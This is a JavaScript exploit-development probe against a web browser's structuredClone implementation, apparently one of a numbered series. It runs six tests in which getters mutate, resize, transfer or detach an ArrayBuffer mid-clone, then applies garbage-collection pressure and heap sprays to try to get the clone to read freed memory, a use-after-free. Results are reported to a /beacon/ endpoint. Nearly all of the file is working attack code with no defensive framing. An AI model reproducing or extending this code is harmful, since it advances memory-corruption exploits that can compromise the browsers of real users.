/* p87-timing — Definitive copy timing + GC-pressure UAF
 *
 * p86 showed: spray never lands because transfer doesn't free memory.
 * W5 showed: 256KB read through mprotected pages.
 *
 * QUESTION: Does serializer copy data BEFORE or AFTER the getter?
 * TEST: Getter modifies the SAME buffer BEFORE detaching/shrinking.
 *       If clone has pre-modification data → copy is inline (before getter)
 *       If clone has post-modification data → copy is deferred (after getter)
 *
 * Also: GC-pressure approach to actually FREE the transferred backing store.
 *
 * Beacon prefix: V87T-
 */
(function(){
"use strict";
var RUN_ID = "v87t" + Math.random().toString(36).slice(2,12);
var PREFIX = "V87T-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press87-timing");

/* ====== T1: Definitive timing — modify buffer in getter ====== */
function test_T1() {
  var r = {};
  try {
    var ab = new ArrayBuffer(4096);
    var u8 = new Uint8Array(ab);
    u8.fill(0xAA); // original pattern

    var obj = {};
    obj.buf = ab;

    Object.defineProperty(obj, 'zzz_modify', {
      enumerable: true,
      get: function() {
        // Modify the buffer BEFORE detaching
        // If clone has 0xAA → copy happened before this getter
        // If clone has 0xBB → copy happened after this getter
        var view = new Uint8Array(ab);
        view.fill(0xBB); // overwrite with new pattern
        return "modified";
      }
    });

    var cloned = structuredClone(obj);
    if (cloned.buf instanceof ArrayBuffer) {
      var cv = new Uint8Array(cloned.buf);
      r.byte0 = cv[0];
      r.byte2000 = cv[2000];
      r.byte4095 = cv[4095];

      var aaCount = 0, bbCount = 0;
      for (var i = 0; i < cv.length; i++) {
        if (cv[i] === 0xAA) aaCount++;
        else if (cv[i] === 0xBB) bbCount++;
      }
      r.aaCount = aaCount;
      r.bbCount = bbCount;
      r.COPY_BEFORE = aaCount === 4096; // copy before getter
      r.COPY_AFTER = bbCount === 4096;  // copy after getter
      r.COPY_MIXED = aaCount > 0 && bbCount > 0; // copy during getter (partial)
    }
  } catch(e) { r.err = e.message.slice(0,80); }
  B("T1-MODIFY-TIMING", r);
}

/* ====== T2: Same but with RAB — modify + shrink ====== */
function test_T2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(4096, { maxByteLength: 4096 });
    var u8 = new Uint8Array(rab);
    u8.fill(0xCC); // original

    var obj = {};
    obj.buf = rab;

    Object.defineProperty(obj, 'zzz_modify', {
      enumerable: true,
      get: function() {
        // First modify bytes [0..64) to 0xDD
        var view = new Uint8Array(rab);
        for (var i = 0; i < 64; i++) view[i] = 0xDD;
        // Then shrink to 64
        rab.resize(64);
        return "modified+shrunk";
      }
    });

    var cloned = structuredClone(obj);
    if (cloned.buf instanceof ArrayBuffer) {
      var cv = new Uint8Array(cloned.buf);
      r.clonedLen = cv.length;
      r.byte0 = cv[0]; // 0xCC=before, 0xDD=after modification
      r.byte63 = cv[63];
      if (cv.length > 64) {
        r.byte100 = cv[100]; // should be 0xCC (pre-modify)
      }
      // If byte0=0xDD → getter's modification visible → copy is after getter
      // If byte0=0xCC → copy is before getter
      r.SEES_MODIFY = cv[0] === 0xDD;
      r.SEES_SHRINK = cv.length > 64; // if true → size captured before shrink
    }
  } catch(e) { r.err = e.message.slice(0,80); }
  B("T2-RAB-MODIFY", r);
}

/* ====== T3: GC pressure after transfer to free backing store ====== */
function test_T3() {
  var r = {};
  try {
    var ab = new ArrayBuffer(4096);
    new Uint8Array(ab).fill(0xEE);

    var obj = {};
    obj.buf = ab;

    Object.defineProperty(obj, 'zzz_gc', {
      enumerable: true,
      get: function() {
        // Transfer (detach ab, inner clone gets backing store)
        var tmp = structuredClone(ab, { transfer: [ab] });
        // tmp is the only reference to the backing store
        // Drop it and force GC
        tmp = null;

        // GC pressure: allocate 500MB to force collection
        var garbage;
        for (var g = 0; g < 5; g++) {
          garbage = [];
          for (var i = 0; i < 50000; i++) {
            garbage.push(new ArrayBuffer(1024));
          }
          garbage = null;
        }

        // Now spray: if GC freed the backing store, these might reuse it
        var sprays = [];
        for (var s = 0; s < 200; s++) {
          var spray = new ArrayBuffer(4096);
          new Uint8Array(spray).fill(0x41); // marker
          sprays.push(spray);
        }

        r.sprayCount = sprays.length;
        return "gc-sprayed";
      }
    });

    try {
      var cloned = structuredClone(obj);
      if (cloned.buf instanceof ArrayBuffer) {
        var cv = new Uint8Array(cloned.buf);
        r.clonedLen = cv.length;
        r.byte0 = cv[0];

        var eeCount = 0, markerCount = 0, zeroCount = 0, otherCount = 0;
        for (var k = 0; k < cv.length; k++) {
          if (cv[k] === 0xEE) eeCount++;
          else if (cv[k] === 0x41) markerCount++;
          else if (cv[k] === 0) zeroCount++;
          else otherCount++;
        }
        r.eeCount = eeCount;
        r.markerCount = markerCount;
        r.zeroCount = zeroCount;
        r.otherCount = otherCount;
        r.GC_FREED = markerCount > 0;
        r.PARTIAL_FREE = otherCount > 0;

        // Check first 64 bytes hex
        var hex = [];
        for (var h = 0; h < 32; h++) hex.push(cv[h].toString(16).padStart(2,'0'));
        r.first32hex = hex.join('');
      }
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,60);
    }
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("T3-GC-PRESSURE", r);
}

/* ====== T4: Transfer via MessagePort then discard ====== */
function test_T4() {
  var r = {};
  try {
    var ab = new ArrayBuffer(4096);
    new Uint8Array(ab).fill(0xFF);

    var obj = {};
    obj.buf = ab;

    Object.defineProperty(obj, 'zzz_port', {
      enumerable: true,
      get: function() {
        // Transfer via MessagePort — different code path
        var mc = new MessageChannel();
        mc.port1.postMessage(ab, [ab]); // detaches ab
        // Close both ports — should trigger cleanup
        mc.port1.close();
        mc.port2.close();
        mc = null;

        // GC pressure
        var garbage = [];
        for (var i = 0; i < 100000; i++) garbage.push(new ArrayBuffer(512));
        garbage = null;

        // Spray
        for (var s = 0; s < 200; s++) {
          var spray = new ArrayBuffer(4096);
          new Uint8Array(spray).fill(0x42);
        }
        return "port-transferred";
      }
    });

    try {
      var cloned = structuredClone(obj);
      if (cloned.buf instanceof ArrayBuffer) {
        var cv = new Uint8Array(cloned.buf);
        r.clonedLen = cv.length;
        r.byte0 = cv[0];

        var ffCount = 0, markerCount = 0, otherCount = 0;
        for (var k = 0; k < cv.length; k++) {
          if (cv[k] === 0xFF) ffCount++;
          else if (cv[k] === 0x42) markerCount++;
          else otherCount++;
        }
        r.ffCount = ffCount;
        r.markerCount = markerCount;
        r.otherCount = otherCount;
        r.PORT_FREED = markerCount > 0;
      }
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,60);
    }
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("T4-PORT-XFER", r);
}

/* ====== T5: Double transfer — transfer, then transfer the clone ====== */
function test_T5() {
  var r = {};
  try {
    var ab = new ArrayBuffer(4096);
    new Uint8Array(ab).fill(0xDD);

    var obj = {};
    obj.buf = ab;

    Object.defineProperty(obj, 'zzz_double', {
      enumerable: true,
      get: function() {
        // First transfer: ab → clone1
        var clone1 = structuredClone(ab, { transfer: [ab] });
        // clone1 owns the backing store

        // Second transfer: clone1 → clone2
        var clone2 = structuredClone(clone1, { transfer: [clone1] });
        // clone2 owns the backing store, clone1 is detached

        // Discard clone2 (drop reference)
        // Overwrite clone2 with spray data before it's GC'd? No...
        // But can we transfer clone2 and discard?
        var clone3 = structuredClone(clone2, { transfer: [clone2] });
        clone3 = null;

        // GC pressure
        var garbage = [];
        for (var i = 0; i < 200000; i++) garbage.push(new ArrayBuffer(256));
        garbage = null;

        // Spray
        for (var s = 0; s < 200; s++) {
          var spray = new ArrayBuffer(4096);
          new Uint8Array(spray).fill(0x43);
        }

        return "double-transferred";
      }
    });

    try {
      var cloned = structuredClone(obj);
      if (cloned.buf instanceof ArrayBuffer) {
        var cv = new Uint8Array(cloned.buf);
        r.clonedLen = cv.length;
        r.byte0 = cv[0];

        var ddCount = 0, markerCount = 0, otherCount = 0;
        for (var k = 0; k < cv.length; k++) {
          if (cv[k] === 0xDD) ddCount++;
          else if (cv[k] === 0x43) markerCount++;
          else otherCount++;
        }
        r.ddCount = ddCount;
        r.markerCount = markerCount;
        r.otherCount = otherCount;
        r.DOUBLE_FREED = markerCount > 0;
      }
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,60);
    }
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("T5-DOUBLE-XFER", r);
}

/* ====== T6: Verify RAB shrink with modification marker ====== */
function test_T6() {
  var r = {};
  try {
    // 256KB RAB — BIG enough to cross page boundaries
    var BIGSIZE = 256 * 1024;
    var rab = new ArrayBuffer(BIGSIZE, { maxByteLength: BIGSIZE });
    var u8 = new Uint8Array(rab);
    u8.fill(0xAA); // original pattern

    var obj = {};
    obj.buf = rab;

    Object.defineProperty(obj, 'zzz_mark', {
      enumerable: true,
      get: function() {
        // Modify first 64 bytes to 0xFF BEFORE shrinking
        var view = new Uint8Array(rab);
        for (var i = 0; i < 64; i++) view[i] = 0xFF;

        // Shrink to 64 bytes
        rab.resize(64);

        // After shrink, modify first 32 bytes to 0x99
        var view2 = new Uint8Array(rab);
        for (var j = 0; j < 32; j++) view2[j] = 0x99;

        return "marked+shrunk";
      }
    });

    try {
      var cloned = structuredClone(obj);
      if (cloned.buf instanceof ArrayBuffer) {
        var cv = new Uint8Array(cloned.buf);
        r.clonedLen = cv.length;
        r.byte0 = cv[0]; // 0xAA=before-all, 0xFF=after-mark-before-shrink, 0x99=after-shrink
        r.byte31 = cv[31];
        r.byte32 = cv.length > 32 ? cv[32] : -1;
        r.byte63 = cv.length > 63 ? cv[63] : -1;
        r.byte64 = cv.length > 64 ? cv[64] : -1;
        r.byte1000 = cv.length > 1000 ? cv[1000] : -1;

        // Decode timing:
        // byte0=0xAA → copy before ANY modification (fully inline)
        // byte0=0xFF, byte32=0xFF → copy after mark1 but before shrink
        // byte0=0x99 → copy after ALL modifications (fully deferred)
        // byte0=0xFF, byte32=0xFF, byte64=0xAA → copy after mark1, before shrink
        if (cv[0] === 0xAA) r.TIMING = "BEFORE_ALL";
        else if (cv[0] === 0x99) r.TIMING = "AFTER_ALL";
        else if (cv[0] === 0xFF) r.TIMING = "AFTER_MARK1";
        else r.TIMING = "UNKNOWN:" + cv[0];
      }
    } catch(e) {
      r.err = e.name + ":" + e.message.slice(0,80);
    }
  } catch(e) { r.outerErr = e.message.slice(0,80); }
  B("T6-BIG-MARK", r);
}

/* ====== Run ====== */
try {
  test_T1();
  setTimeout(test_T2, 200);
  setTimeout(test_T3, 600);
  setTimeout(test_T4, 3000);
  setTimeout(test_T5, 5500);
  setTimeout(test_T6, 8000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 3000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe87-done"); }, 25000);
})();
